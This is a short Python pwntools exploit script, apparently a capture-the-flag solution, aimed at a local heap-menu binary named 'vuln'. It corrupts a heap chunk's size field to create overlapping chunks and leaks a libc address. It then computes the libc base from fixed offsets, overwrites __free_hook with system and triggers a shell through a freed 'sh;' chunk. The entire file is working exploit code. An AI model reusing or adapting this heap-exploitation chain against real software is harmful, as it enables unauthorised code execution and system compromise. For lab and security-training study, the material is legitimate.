from pwn import *
io=process("./vuln",env={"LD_PRELOAD":"./libc.so.6"})


def add(data):
    io.sendlineafter("> ","w")
    io.sendline(data)

def read(idx):
    io.sendlineafter("> ","r")
    io.sendline(str(idx))

def rewrite(idx,data):
    io.sendlineafter("> ","e")
    io.sendline(str(idx))
    io.sendline(data)

add("a"*30)       # 0
add("a"*30)       # 1
add("a"*30)       # 2 
add("a"*1400)     # 3
add("a"*30)       # 4
read(0)           # all freed
read(1) 
read(2)
read(3)
add("1"*40)       # 0 
add("1"*1310)      # 1
add("0"*10)       # 2
pay="a"*56+p32(0x551)
rewrite(3,pay)   # overwriting 1th chunks size to point it to after 2th chunk
read(1)          # getting overlapping chunks
add(","*1310)      # 1
read(1)           # 1
read(2)           # 2

libc_leak=u64(io.recv(6)+"\x00\x00")
print hex(libc_leak)

libc_base=libc_leak-0x1e4ca0
system=libc_base+0x50300+5
freehook=libc_base+0x1e68e8

log.info("System @ "+str(hex(system)))
log.info("Libc @ "+str(hex(libc_base)))
log.info("Free @ "+str(hex(freehook)))

payload="/"*1328+p64(freehook)

add(payload)     # 1
add("sh;aaaaa")       # 2
add(p64(system))     # 3
gdb.attach(io)

io.interactive()
